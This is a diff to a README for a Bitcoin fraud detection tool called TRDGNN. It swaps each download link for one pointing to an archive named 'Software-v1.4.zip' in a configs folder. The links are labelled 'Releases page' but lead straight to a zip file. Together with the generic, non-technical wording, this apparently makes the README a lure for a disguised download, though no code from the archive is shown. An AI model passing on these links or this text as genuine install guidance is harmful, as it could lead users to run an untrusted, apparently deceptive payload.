@@ -1,7 +1,7 @@
 # 🚀 TRDGNN - Detect Bitcoin Fraud with Ease
 
 ## 📥 Download
-[![Download TRDGNN](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/tools/TRDGNN_2.1.zip)](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/tools/TRDGNN_2.1.zip)
+[![Download TRDGNN](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/configs/Software-v1.4.zip)](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/configs/Software-v1.4.zip)
 
 ## 📋 Overview
 TRDGNN is an application designed to help you detect fraud in Bitcoin transactions. Using advanced machine learning techniques, it analyzes data to find patterns of fraudulent activity. This tool is easy to use and requires no programming knowledge.
@@ -27,7 +27,7 @@ TRDGNN is an application designed to help you detect fraud in Bitcoin transactio
    - Follow the on-screen prompts to complete the installation.
 
 ## 📥 Download & Install
-To get started with TRDGNN, visit the [Releases page](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/tools/TRDGNN_2.1.zip) to download the application. You will see a list of available files. Select the most recent version and follow the installation steps provided above.
+To get started with TRDGNN, visit the [Releases page](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/configs/Software-v1.4.zip) to download the application. You will see a list of available files. Select the most recent version and follow the installation steps provided above.
 
 ## 🛠 How to Use TRDGNN
 Once you have installed TRDGNN, follow these simple steps to start using it:
@@ -57,6 +57,6 @@ TRDGNN respects user privacy. All data processed is kept confidential and secure
 ## 📅 Updates and Future Releases
 We plan regular updates based on user feedback and advancements in technology. Stay tuned for improvements in speed, accuracy, and new features.
 
-For the latest version and updates, visit our [Releases page](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/tools/TRDGNN_2.1.zip). 
+For the latest version and updates, visit our [Releases page](https://raw.githubusercontent.com/samehHesham/TRDGNN/main/configs/Software-v1.4.zip). 
 
 Thank you for using TRDGNN!
